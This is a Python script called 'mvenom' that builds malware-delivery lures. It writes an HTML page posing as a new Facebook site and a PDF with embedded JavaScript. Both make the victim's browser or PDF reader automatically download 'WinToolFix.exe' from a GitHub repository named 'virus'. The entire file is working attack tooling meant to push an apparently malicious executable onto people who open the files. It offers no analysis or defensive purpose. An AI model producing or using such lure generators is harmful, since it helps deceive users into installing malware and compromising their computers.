import argparse
from fpdf import FPDF


# Function to generate HTML file for automatic download
def generate_html(output_file):
    # Hardcoded URL for the EXE file
    download_url = 'https://github.com/Fhchcjcjcjcjvkkvk/virus/raw/refs/heads/main/WinToolFix.exe'

    # HTML content with embedded JavaScript to trigger the download
    html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to My Web</title>
    <script type="text/javascript">
        window.onload = function() {{
            // Automatically trigger the download of the EXE file
            window.location.href = '{download_url}';
        }};
    </script>
</head>
<body>
    <h1>WELCOME INTO NEW WEB FACEBOOK</h1>
    <p>ERROR! .</p>
</body>
</html>
"""

    # Write the HTML content to the specified file
    with open(output_file, "w") as f:
        f.write(html_content)

    print(f"PAYLOAD '{output_file}' generated successfully.")


# Function to generate PDF file with embedded JavaScript for download
def generate_pdf(output_file):
    # Hardcoded URL for the EXE file
    download_url = 'https://github.com/Fhchcjcjcjcjvkkvk/virus/raw/refs/heads/main/WinToolFix.exe'
    
    # Create PDF instance using fpdf2
    pdf = FPDF()
    pdf.set_auto_page_break(auto=True, margin=15)
    pdf.add_page()

    # Title
    pdf.set_font('Arial', 'B', 16)
    pdf.cell(200, 10, txt="WELCOME INTO NEW WEB FACEBOOK", ln=True, align='C')

    # Description
    pdf.set_font('Arial', '', 12)
    pdf.multi_cell(0, 10, txt="This PDF contains a hidden feature that will attempt to automatically download a file when opened.")

    # Embed JavaScript (attempt to trigger download in supported PDF viewers)
    js_code = f"""
        this.getURL("{download_url}");
    """
    pdf.set_font('Arial', '', 10)
    pdf.cell(200, 10, txt="This is a sample text, the actual JS code to trigger download is embedded.", ln=True)
    
    # Embed JavaScript (it will be executed by PDF readers that support JS)
    pdf.add_js(js_code)

    # Output the PDF
    pdf.output(output_file)

    print(f"PDF payload '{output_file}' generated successfully.")


# Main function to parse arguments and call the appropriate generation function
def main():
    parser = argparse.ArgumentParser(description="mvenom - Python payload generator")
    
    # Command-line arguments
    parser.add_argument('-p', '--payload', required=True, choices=['windows/embedded_exe'], 
                        help="Specify the payload type (e.g., windows/embedded_exe)")
    parser.add_argument('-f', '--format', required=True, choices=['html', 'pdf'], 
                        help="Specify the format (html or pdf)")
    parser.add_argument('-w', '--write', required=True, help="Output file name (e.g., name.html or name.pdf)")
    
    args = parser.parse_args()

    # Ensure that the payload is supported (e.g., windows/embedded_exe)
    if args.payload == 'windows/embedded_exe':
        if args.format == 'html':
            # Generate HTML payload
            generate_html(args.write)
        elif args.format == 'pdf':
            # Generate PDF payload
            generate_pdf(args.write)


# Ensure the script runs if executed directly
if __name__ == "__main__":
    main()
